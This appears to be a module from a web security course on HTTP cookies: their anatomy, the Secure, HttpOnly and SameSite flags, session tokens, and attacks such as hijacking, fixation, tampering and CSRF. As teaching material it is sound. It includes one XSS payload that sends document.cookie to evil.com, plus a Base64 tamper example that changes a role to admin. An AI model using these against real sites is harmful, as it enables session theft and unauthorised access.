Module 04 — Cookie Inspection & Manipulation

Understand cookie anatomy, security flags, and how attackers exploit weak session management.

Why Cookies Exist — HTTP's Memory Problem

Here is a fundamental truth about HTTP that surprises many people: HTTP is stateless. Every single request your browser sends is treated by the server as if it is coming from a complete stranger. The server has no memory of previous requests. It does not know you logged in 2 seconds ago. It does not know you put something in your cart. It does not know you exist.

This is obviously a problem. You do not want to type your password on every single page. So in 1994, Lou Montulli — a 23-year-old programmer at Netscape — invented cookies to give HTTP a memory. The idea was simple: the server sends a small piece of data (the cookie) to the browser, and the browser automatically sends it back with every subsequent request to that server. The cookie acts as a "name tag" that says "Hey, it is me again, the person who logged in earlier."

Cookies are the reason the modern web works. Without them, there would be no login sessions, no shopping carts, no "remember me" checkboxes, no personalized anything. They are also the reason many web attacks work — because cookies are sent automatically by the browser, and anything that is automatic can be exploited.

Security Flags in Detail

Secure Flag

When set, the cookie is only transmitted over HTTPS connections. Without it, an attacker on the same network can intercept cookies via HTTP.

HttpOnly Flag

Prevents JavaScript from accessing the cookie via document.cookie. This mitigates XSS-based session theft. Without it:

// XSS payload to steal session cookie
new Image().src = "https://evil.com/steal?c=" + document.cookie;

SameSite Attribute

  • Strict: Cookie never sent on cross-site requests (best CSRF protection)
  • Lax: Sent on top-level navigations (GET only) — default in modern browsers
  • None: Always sent (requires Secure flag) — needed for third-party contexts

Base64-Encoded Cookie Values

Many applications encode cookie values in Base64 for transport. This is encoding, not encryption — anyone can decode it:

// Server sets cookie:
Set-Cookie: session=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9

// Attacker decodes:
atob("eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9")
// → {"user":"guest","role":"user"}

// Attacker modifies and re-encodes:
btoa('{"user":"guest","role":"admin"}')
// → eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==
Never trust client-side data. Cookies can be freely modified by the user. Always validate session data server-side. Use signed/encrypted tokens (like JWTs with proper validation) instead of plain Base64.

Predictable Session Tokens

Weak session tokens can be predicted or brute-forced:

  • Sequential numbers: session=1001, session=1002
  • Timestamp-based: session=1711920000
  • Weak hashes: MD5 of username

Secure tokens should be cryptographically random with at least 128 bits of entropy.

Session Attacks — What Hackers Do With Cookies

Cookies are the keys to the kingdom. If an attacker gets your session cookie, they do not need your password — they ARE you, as far as the server is concerned. Here are the main cookie-based attacks:

  • Session hijacking (cookie theft): Stealing a session cookie via XSS (document.cookie), network sniffing (no Secure flag), or malware. With the cookie, the attacker impersonates the victim.
  • Session fixation: The attacker sets a known session ID before the victim logs in. If the server does not regenerate the session ID after authentication, the attacker's pre-set cookie is now an authenticated session.
  • Cookie tampering: If session data is stored client-side (in the cookie value itself) without proper signing, the attacker can modify it — changing role:user to role:admin.
  • CSRF: Because cookies are sent automatically on every request, a malicious site can trigger requests to another site using the victim's session cookie. (We cover this in depth in Module 17.)
The Secure Cookie Checklist: Every session cookie should have: (1) Secure flag (HTTPS only), (2) HttpOnly flag (no JavaScript access), (3) SameSite=Lax or Strict (CSRF protection), (4) a cryptographically random value with at least 128 bits of entropy, (5) an appropriate expiration time, and (6) server-side session storage (do not store sensitive data in the cookie value itself).
